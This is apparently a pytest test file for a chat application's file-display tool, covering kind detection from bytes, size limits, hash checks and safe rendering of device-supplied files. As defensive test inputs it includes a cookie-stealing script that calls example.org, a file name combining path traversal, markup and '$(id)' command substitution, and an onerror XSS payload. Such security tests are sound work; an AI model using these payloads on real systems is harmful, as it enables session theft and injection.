"""A file an agent shows that is not text: drawn in the conversation by its
kind, whether or not the chat's model could read it.

The chat's own `show` tool on a file of the tree, and a linked computer's
`_lembas/show` with a handle (harness spec 3.11.0), whose bytes this server
fetches over the link. The device is a `Link` with its requests answered here;
nothing runs on this machine.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import json

import pytest
from sqlalchemy import select

from lembas.db.models import Message, Node, ShownFile
from lembas.services import device_link, fs
from lembas.services import generation as generation_service
from lembas.services.media import shown as shown_media
from tests.test_chat_files import Session, _setup
from tests.test_device_sync import _agents_on, _clean, _device_chat, _linked, _say  # noqa: F401
from tests.test_media_jobs import GLB, MP3, MP4, PNG, world  # noqa: F401

PDF = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n1 0 obj\n<<>>\nendobj\n" + b"\x00" * 32
ZIP = b"PK\x03\x04\x14\x00\x00\x00\x08\x00" + b"\x00" * 64
PAGE = b"<!doctype html><script>fetch('https://example.org/?' + document.cookie)</script>"


def _file(db, user, path: str, data: bytes) -> Node:
    node = fs.write(fs.view(db, user), path, data)
    db.commit()
    return node


# --- The chat's own `show` ------------------------------------------------------------
@pytest.mark.parametrize(
    ("name", "data", "kind", "mime"),
    [
        ("chart.png", PNG, "image", "image/png"),
        ("memo.mp3", MP3, "audio", "audio/mpeg"),
        ("demo.mp4", MP4, "video", "video/mp4"),
        ("ring.glb", GLB, "model3d", "model/gltf-binary"),
        ("report.pdf", PDF, "pdf", "application/pdf"),
        ("bundle.zip", ZIP, "archive", "application/zip"),
        ("core.dump", b"\x00\x01\x02\x03" * 40, "binary", "application/octet-stream"),
    ],
)
def test_a_file_that_is_not_text_is_shown_by_its_kind(db, name, data, kind, mime):
    user, chat = _setup(db)
    home = fs.ensure_home(db, user).path
    node = _file(db, user, f"{home}/{name}", data)
    before = db.scalars(select(Node)).all()
    _, outcome = Session(user, chat).call("show", path=f"{home}/{name}")
    assert outcome.content == f"Shown to the user: {home}/{name}."
    event = outcome.event
    assert event["name"] == "show" and event["status"] == "ok" and "show" not in event
    media = event["media"]
    assert (media["kind"], media["mime"]) == (kind, mime)
    # The file itself, by its id: nothing was copied, and no byte is in the card.
    assert media["node_id"] == node.id and media["path"] == f"{home}/{name}"
    assert media["name"] == name and media["size"] == len(data) and media["shown"] is True
    assert media["version_id"]
    assert len(db.scalars(select(Node)).all()) == len(before)
    if kind == "image":
        assert (media["width"], media["height"]) == (1, 1)


def test_what_a_file_is_is_read_from_its_bytes_not_its_name(db):
    """A web page called a picture is not a picture: it takes the text way,
    into the viewer, which never serves it as a page of this application."""
    user, chat = _setup(db)
    home = fs.ensure_home(db, user).path
    _file(db, user, f"{home}/holiday.png", PAGE)
    _, outcome = Session(user, chat).call("show", path=f"{home}/holiday.png")
    assert "media" not in outcome.event
    assert outcome.event["show"]["kind"] == "text"
    # And a picture called a text file is the picture it is.
    _file(db, user, f"{home}/notes.txt", PNG)
    _, outcome = Session(user, chat).call("show", path=f"{home}/notes.txt")
    assert outcome.event["media"]["kind"] == "image"
    assert outcome.event["media"]["mime"] == "image/png"


def test_a_file_past_the_limit_is_refused_in_words(db, monkeypatch):
    user, chat = _setup(db)
    home = fs.ensure_home(db, user).path
    _file(db, user, f"{home}/film.mp4", MP4 + b"\x00" * (3 * 1024 * 1024))
    monkeypatch.setattr(shown_media, "limits", lambda: {
        "max_bytes": 2 * 1024 * 1024, "chunk_bytes": 1024 * 1024, "wait_seconds": 5})
    text, outcome = Session(user, chat).call("show", path=f"{home}/film.mp4")
    assert "media" not in (outcome.event or {})
    assert f"{home}/film.mp4 is 3 MB; at most 2 MB can be shown" in text
    assert "Give the user the path instead." in text


def test_the_limit_is_64_mb_and_a_megabyte_a_part():
    assert shown_media.limits() == {
        "max_bytes": 64 * 1024 * 1024, "chunk_bytes": 1024 * 1024, "wait_seconds": 300}


def test_a_file_the_chat_may_not_read_is_not_shown(db):
    """Through the chat's own access, as every tool: a grant elsewhere does
    not show this file."""
    user, chat = _setup(db, grants={"/home/frodo/open": "rw"})
    home = fs.ensure_home(db, user).path
    _file(db, user, f"{home}/secret/chart.png", PNG)
    text, outcome = Session(user, chat).call("show", path=f"{home}/secret/chart.png")
    assert "media" not in (outcome.event or {}) and "show" not in (outcome.event or {})
    assert "Shown to the user" not in text


def test_a_text_file_is_still_the_viewers(db):
    user, chat = _setup(db)
    home = fs.ensure_home(db, user).path
    _file(db, user, f"{home}/plan.md", b"# Plan\n")
    _, outcome = Session(user, chat).call("show", path=f"{home}/plan.md")
    assert outcome.event["show"]["kind"] == "markdown" and "media" not in outcome.event


# --- A linked computer's file -----------------------------------------------------------
def _device_shows(db, make_chat, data: bytes, *, path="out/chart.png", said=None, lie=None,
                  chunk=None, fail=None):
    """A turn on a linked computer whose `show` hands over `data` by a handle."""
    answers: list[dict] = []
    reads: list[dict] = []
    holder: dict = {}

    def answer(method, params):
        return holder["answer"](method, params)

    link, _ = _linked(db, answer=answer)
    link.initialized = {"_meta": {"lembas": {"capabilities": ["sessions", "show", "media"]}}}
    real_send = link.send_text

    async def send_text(text):
        message = json.loads(text)
        if message.get("id") == 41:
            answers.append(message)
        await real_send(text)

    link.send_text = send_text
    params = {
        "sessionId": "s1", "toolCallId": "call_7", "path": path, "kind": "image",
        "mimeType": "image/png", "size": len(data),
        "hash": "sha256:" + hashlib.sha256(data).hexdigest(), "handle": "h_1",
        **(said or {}),
    }

    async def respond(method, params_in):
        if method == "_lembas/show/read":
            reads.append(params_in)
            if fail is not None:
                raise fail
            assert params_in["handle"] == "h_1"
            sent = lie if lie is not None else data
            size = chunk or params_in["length"]
            piece = sent[params_in["offset"] : params_in["offset"] + size]
            return {"data": base64.b64encode(piece).decode(), "offset": params_in["offset"],
                    "eof": params_in["offset"] + len(piece) >= len(sent)}
        if method != "session/prompt":
            return {}
        for event in ({"type": "task", "state": "start"},
                      {"type": "tool_start", "id": "call_7", "name": "show",
                       "args": {"path": path}}):
            await link._notification("_lembas/event", {"sessionId": "s1", "event": event})
        await link.receive(json.dumps(
            {"jsonrpc": "2.0", "id": 41, "method": "_lembas/show", "params": params}))
        for _ in range(300):
            if answers:
                break
            await asyncio.sleep(0.01)
        shown = answers[-1]["result"]
        for event in (
            {"type": "tool_end", "id": "call_7", "name": "show", "result": {
                "output": "Shown." if shown.get("shown") else shown.get("reason", ""),
                "isError": not shown.get("shown")}},
            {"type": "text", "text": "There it is."},
            {"type": "task", "state": "end"},
        ):
            await link._notification("_lembas/event", {"sessionId": "s1", "event": event})
        return {"stopReason": "end_turn"}

    holder["answer"] = respond
    chat_id = _device_chat(db, make_chat, link)
    _say(db, chat_id, "user", "show me the chart")
    reply_id = _say(db, chat_id, "assistant", "", complete_=False)

    async def scenario():
        generation_service.ensure(chat_id, reply_id)
        await asyncio.wait_for(generation_service._TASKS[reply_id], 10)

    asyncio.run(scenario())
    db.expire_all()
    reply = db.get(Message, reply_id)
    tool = next(t for t in reply.tool_calls_json if t.get("name") == "show")
    return chat_id, tool, answers[-1]["result"], reads


def test_this_server_says_it_shows_media(db, registered):
    seen = {}

    async def run():
        link, _ = _linked(db)

        async def request(method, params=None, *, timeout=60):
            seen[method] = params
            return {}

        link.request = request
        await device_link.handshake(link)

    asyncio.run(run())
    said = seen["initialize"]["clientCapabilities"]["_meta"]["lembas"]
    assert said["show"] is True and said["media"] is True


def test_a_devices_picture_is_fetched_kept_and_drawn(client, db, registered, make_chat):
    chat_id, tool, result, reads = _device_shows(db, make_chat, PNG)
    assert result == {"shown": True}
    media = tool["media"]
    assert media["kind"] == "image" and media["mime"] == "image/png" and media["shown"] is True
    assert (media["width"], media["height"]) == (1, 1) and media["size"] == len(PNG)
    # In the person's files, under Generated/, with its own name and the moment.
    assert "/Generated/chart-" in media["path"] and media["name"].endswith(".png")
    node = db.get(Node, media["node_id"])
    assert node is not None and node.size == len(PNG)
    # No text copy was kept beside it: it is a file, not a shown text.
    assert db.scalar(select(ShownFile)) is None and "show" not in tool
    # The bytes are read by the file's id, as the card asks for them.
    raw = client.get(f"/files/raw?node={media['node_id']}&inline=1")
    assert raw.status_code == 200 and raw.content == PNG
    assert raw.headers["content-type"].startswith("image/png")


def test_a_large_file_is_fetched_in_parts_by_offset(client, db, registered, make_chat):
    data = MP4 + bytes(range(256)) * 40
    _, tool, result, reads = _device_shows(db, make_chat, data, path="demo.mp4", chunk=3000)
    assert result == {"shown": True} and tool["media"]["kind"] == "video"
    assert [r["offset"] for r in reads] == list(range(0, len(data), 3000))
    assert all(r["length"] == 1024 * 1024 for r in reads)
    assert tool["media"]["size"] == len(data)


def test_the_devices_word_for_the_kind_is_only_a_hint(client, db, registered, make_chat):
    """Called a picture, and a web page: kept as the text it is, never drawn
    as a picture and never served as a page."""
    _, tool, result, _ = _device_shows(db, make_chat, PAGE, path="holiday.png")
    assert result == {"shown": True}
    media = tool["media"]
    assert media["kind"] == "text" and not media["mime"].startswith("image/")
    assert "width" not in media
    raw = client.get(f"/files/raw?node={media['node_id']}&inline=1")
    assert not raw.headers["content-type"].startswith(("text/html", "image/"))


def test_a_pdf_called_a_picture_is_named_for_what_it_is(client, db, registered, make_chat):
    _, tool, result, _ = _device_shows(db, make_chat, PDF, path="scan.png")
    assert result == {"shown": True}
    assert tool["media"]["kind"] == "pdf" and tool["media"]["name"].endswith(".pdf")


def test_a_name_from_a_device_cannot_leave_generated(client, db, registered, make_chat):
    _, tool, result, _ = _device_shows(db, make_chat, PNG, path="../../etc/<b>x</b> $(id).png")
    assert result == {"shown": True}
    path = tool["media"]["path"]
    assert "/Generated/" in path and ".." not in path and "<" not in path and "$" not in path


def test_a_file_the_device_says_is_too_large_is_refused_before_a_byte(
    client, db, registered, make_chat
):
    _, tool, result, reads = _device_shows(
        db, make_chat, PNG, said={"size": 65 * 1024 * 1024})
    assert result["shown"] is False
    assert "65 MB; at most 64 MB can be shown" in result["reason"]
    assert reads == [] and "media" not in tool


def test_more_bytes_than_the_limit_are_not_kept_whatever_was_said(
    client, db, registered, make_chat, monkeypatch
):
    monkeypatch.setattr(shown_media, "limits", lambda: {
        "max_bytes": 4096, "chunk_bytes": 2048, "wait_seconds": 5})
    _, tool, result, reads = _device_shows(
        db, make_chat, PNG, lie=PNG + b"\x00" * 20000, said={"size": 100})
    assert result["shown"] is False and "can be shown" in result["reason"]
    assert len(reads) <= 4 and "media" not in tool
    assert db.scalar(select(Node).where(Node.name.like("chart-%"))) is None


def test_other_bytes_than_the_hash_named_are_not_kept(client, db, registered, make_chat):
    _, tool, result, _ = _device_shows(db, make_chat, PNG, lie=PNG[:-1] + b"\x00")
    assert result["shown"] is False and "changed while it was fetched" in result["reason"]
    assert "media" not in tool


def test_a_device_that_refuses_the_read_is_said_in_words(client, db, registered, make_chat):
    _, tool, result, _ = _device_shows(
        db, make_chat, PNG, fail=device_link.DeviceError("That handle is no longer good."))
    assert result["shown"] is False
    assert "could not be fetched" in result["reason"] and "no longer good" in result["reason"]
    assert "media" not in tool


def test_a_table_an_svg_and_a_notebook_from_a_device_are_shown_as_text(
    db, registered, make_chat
):
    from lembas.services import shown

    chat_id = make_chat()

    for kind, drawn, language in (("table", "text", ""), ("svg", "code", "xml"),
                                  ("notebook", "code", "json")):
        row = shown.keep(db, chat_id=chat_id, message_id="m1", params={
            "path": f"a.{kind}", "kind": kind, "text": "x", "toolCallId": "t"})
        assert (row.kind, row.language) == (drawn, language)


# --- The card -----------------------------------------------------------------------------
def _reply_with(db, world, *medias) -> str:  # noqa: F811
    chat_id = world["chat"].id
    db.add(Message(chat_id=chat_id, role="assistant", content="Here.", complete=True,
                   tool_calls_json=[{"name": "show", "status": "ok", "media": m}
                                    for m in medias]))
    db.commit()
    return chat_id


def _media(kind: str, name: str, **extra) -> dict:
    return {"kind": kind, "path": f"/home/frodo/Generated/{name}", "node_id": f"node-{kind}",
            "version_id": "v", "name": name, "mime": "x/y", "size": 1000, "shown": True, **extra}


def test_each_kind_has_its_card_and_every_card_its_bar(client, db, world):  # noqa: F811
    chat_id = _reply_with(
        db, world,
        _media("image", "chart.png", width=640, height=480),
        _media("audio", "memo.mp3"), _media("video", "demo.mp4"),
        _media("model3d", "ring.glb"), _media("pdf", "report.pdf"),
        _media("archive", "bundle.zip"), _media("binary", "core.dump"),
        _media("pdf", "atlas.pdf", size=65 * 1024 * 1024, node_id="node-big"),
    )
    page = client.get(f"/chat/{chat_id}").text
    assert page.count('data-testid="media-card"') == 8
    assert page.count('data-testid="media-open"') == 8
    assert page.count('data-testid="media-download"') == 8
    for wanted in ('data-testid="media-audio"', 'data-testid="media-video"',
                   'data-testid="media-model"', 'class="media-card__image"'):
        assert page.count(wanted) == 1, wanted
    # A PDF in the sealed frame, fed the bytes by the page; one too large for
    # the frame is its bar alone.
    assert page.count('data-testid="media-pdf"') == 1
    frame = page.split('data-testid="media-pdf"', 1)[0].rsplit("<iframe", 1)[1]
    assert 'sandbox="allow-scripts"' in frame and 'src="/files/viewer/pdf"' in frame
    assert 'data-raw="/files/raw?node=node-pdf"' in frame and "pdf.worker.min.mjs" in frame
    # Nothing a browser would run or show is taken from the event: an archive
    # and a file of no known kind are a name and two buttons.
    for kind in ("archive", "binary"):
        card = page.split(f'data-media-kind="{kind}"', 1)[1].split("</figure>", 1)[0]
        assert "<iframe" not in card and "<img" not in card and "<video" not in card


def test_a_name_with_markup_in_it_is_text_on_the_card(client, db, world):  # noqa: F811
    chat_id = _reply_with(db, world, _media("binary", '<img src=x onerror="alert(1)">.bin'))
    page = client.get(f"/chat/{chat_id}").text
    assert "<img src=x" not in page and "&lt;img src=x" in page
